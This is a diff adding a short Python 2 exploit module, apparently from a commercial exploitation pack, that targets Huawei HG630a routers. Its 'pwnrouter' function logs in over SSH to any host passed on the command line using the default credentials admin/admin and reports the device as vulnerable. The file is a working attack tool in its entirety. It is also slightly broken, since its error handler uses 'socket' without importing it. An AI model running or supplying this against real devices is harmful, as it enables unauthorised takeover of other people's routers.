@@ -1,0 +1,46 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+
+###
+# STD modules
+###
+import os, sys, re
+try:
+  import paramiko
+except:
+  print 'No module paramiko'
+  sys.exit()
+
+_name_   = 'd2sec_huawei_2'
+_vendor_ = 'huawei'
+_model_  = ['HG630a', 'HG630a-50']
+_vuln_   = 'Default Credentials Vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 22
+
+def pwnrouter(host):
+  print '[#] Host : %s'  %host
+  ssh = paramiko.SSHClient()
+  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+  try:
+    print '[+] Trying to authenticate to the SSH server'
+    ssh.connect(host, 22, timeout=5, username='admin', password='admin')
+  except (paramiko.ssh_exception.SSHException, socket.error):
+    print '[-] Exploit failed, %s is not vulnerable' % host    
+    return
+  else:
+    print '[+] Authentication successfull'
+    print '[+] %s is vulnerable : SSH service enabled with default creds admin/admin' % host
+  ssh.close()
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
